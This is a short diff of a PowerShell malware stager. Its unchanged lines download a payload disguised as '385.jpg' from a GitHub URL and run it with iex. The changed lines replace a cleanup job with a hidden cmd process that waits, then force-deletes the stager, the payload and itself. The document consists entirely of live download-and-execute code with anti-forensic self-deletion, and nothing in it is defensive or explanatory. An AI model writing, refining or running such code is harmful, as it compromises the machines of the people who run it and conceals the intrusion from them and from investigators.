@@ -5,8 +5,4 @@ $url="https://github.com/node-nl0/-/raw/main/385.jpg"
 $path="$env:TEMP\385.jpg"
 (New-Object Net.WebClient).DownloadFile($url,$path)
 iex(Get-Content $path -Raw)
-Start-Job -ScriptBlock {
-    Start-Sleep -Seconds 35
-    Remove-Item -Force "$env:TEMP\X1.ps1" -ErrorAction SilentlyContinue
-    Remove-Item -Force "$env:TEMP\385.jpg" -ErrorAction SilentlyContinue
-}
+Start-Process -WindowStyle Hidden cmd -ArgumentList "/c timeout /t 35 /nobreak > nul & del /f /q $env:TEMP\X1.ps1 $env:TEMP\385.jpg & del /f /q %0"
